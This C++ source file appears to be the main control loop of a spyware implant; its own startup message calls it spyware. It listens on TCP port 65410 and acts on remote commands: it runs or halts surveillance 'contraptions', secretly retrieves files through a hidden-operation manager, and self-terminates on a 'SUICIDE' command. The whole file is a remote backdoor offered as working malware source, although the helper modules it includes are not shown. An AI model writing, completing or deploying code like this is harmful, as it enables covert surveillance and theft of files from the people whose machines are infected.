#include <iostream>

#include "../Maneger/Connection.h"
#include "../IncludeCPP/Status.h"

#include "../Maneger/HiderManeger.h"
#include "../Hider/HiderCodes.h"
#include "../Maneger/Listener.h"
#include "../Maneger/Connection.h"
#include "contrapMeta.h"
#include "Contraption.h"
#include "ContraptionAdmin.h"

#define PORT (65410)

void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);


int main() {
    
    std::cout << "sarted spyware" << std::endl;
    
    HiderManeger hiderManager = HiderManeger();
    Listener listener = Listener(PORT);
    ContraptionAdmin admin = ContraptionAdmin();

    bool cont = true;
    while (cont)
    {
        Connection conn;
        // TODO add error strtegy
        if (listener.acceptConnection(conn) == -1) {
            std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
            sleep(10);
            continue;
        }
        loopIter(conn, hiderManager, admin);
        std::cout << "compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}



void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
{
    SpywareCmd cmd;

    conn.recvData(sizeof(cmd), (char*)&cmd);

    Status stat;
    std::string strRes = "";

    switch (cmd.FuncType)
    {
    case RunContraption:
        stat = admin.runContraption(conn, cmd.type, cmd.contIdentifier);
        break;

    case HaltContraption:
        stat = admin.haltContraption(cmd.contIdentifier);
        break;

    case SendFile:
        command hiderCmd;
        hiderCmd.dataLen =0;
        hiderCmd.fncode = HIDDEN_OPRATION | HIDDEN_RETRIEVE_FILE;
        conn.recvData(sizeof(hiderCmd.strParam), hiderCmd.strParam);
        stat = hiderManeger.hiddenAction(hiderCmd, conn);
        break;
    
    case SUICIDE:
        std::exit(EXIT_SUCCESS);
    }
    std::cout << "Conn: res-" << stat << " response-\n" << strRes << std::endl;
    conn.sendResponce(stat, strRes);
    
}
